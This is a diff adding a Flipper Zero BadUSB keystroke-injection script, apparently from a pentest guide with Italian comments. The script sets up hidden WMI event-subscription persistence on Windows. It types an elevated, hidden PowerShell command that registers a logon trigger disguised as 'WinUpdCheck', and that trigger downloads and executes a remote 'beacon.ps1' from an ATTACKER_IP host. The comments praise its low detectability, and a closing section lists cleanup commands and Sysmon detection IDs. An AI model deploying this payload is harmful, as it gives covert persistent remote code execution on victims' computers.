@@ -1,0 +1,32 @@
+REM ============================================================
+REM Title:    WMI Event Subscription Persistence
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Persistence
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~8 secondi
+REM Detect:   Basso - WMI persistence è poco monitorato
+REM Desc:     Crea una WMI event subscription che esegue
+REM           un payload quando un utente fa login. Piu'
+REM           stealth di registry/scheduled task.
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "$filt=[wmiclass]\"\\.\root\subscription:__EventFilter\";$fi=$filt.CreateInstance();$fi.Name=\"WinUpdCheck\";$fi.EventNameSpace=\"root\cimv2\";$fi.QueryLanguage=\"WQL\";$fi.Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_LogonSession''\";$fi.Put()|Out-Null;$cons=[wmiclass]\"\\.\root\subscription:CommandLineEventConsumer\";$co=$cons.CreateInstance();$co.Name=\"WinUpdCheck\";$co.CommandLineTemplate=\"powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8080/beacon.ps1'')\";$co.Put()|Out-Null;$bind=[wmiclass]\"\\.\root\subscription:__FilterToConsumerBinding\";$bi=$bind.CreateInstance();$bi.Filter=$fi.__PATH;$bi.Consumer=$co.__PATH;$bi.Put()|Out-Null"'
+ENTER
+DELAY 2000
+ALT y
+
+REM ============================================================
+REM Rimozione post-engagement:
+REM
+REM Get-WMIObject -Namespace root\Subscription -Class __EventFilter | Where-Object {$_.Name -eq 'WinUpdCheck'} | Remove-WMIObject
+REM Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq 'WinUpdCheck'} | Remove-WMIObject
+REM Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match 'WinUpdCheck'} | Remove-WMIObject
+REM
+REM Detection: Sysmon Event ID 19, 20, 21 (WMI events)
+REM ============================================================
